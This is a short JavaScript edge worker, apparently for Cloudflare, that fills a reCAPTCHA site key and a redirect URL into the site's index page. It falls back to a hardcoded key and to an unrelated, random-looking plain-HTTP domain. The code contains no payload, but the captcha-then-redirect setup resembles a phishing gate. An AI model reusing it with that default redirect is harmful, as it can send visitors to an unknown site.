export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    
    // Only intercept HTML file requests
    if (url.pathname === '/' || url.pathname === '/index.html') {
      const response = await fetch(request);
      let html = await response.text();
      
      // Replace placeholders with environment variables
      html = html.replace(
        'RECAPTCHA_SITE_KEY_PLACEHOLDER',
        env.RECAPTCHA_SITE_KEY || '6Leo4h0tAAAAADRryNMpVjva-36BW8CZT4J-6m6x'
      );
      html = html.replace(
        'REDIRECT_URL_PLACEHOLDER',
        env.REDIRECT_URL || 'http://ej.ydihes.com/'
      );
      
      return new Response(html, {
        status: response.status,
        statusText: response.statusText,
        headers: new Headers(response.headers)
      });
    }
    
    // For all other requests, pass through as-is
    return fetch(request);
  }
};
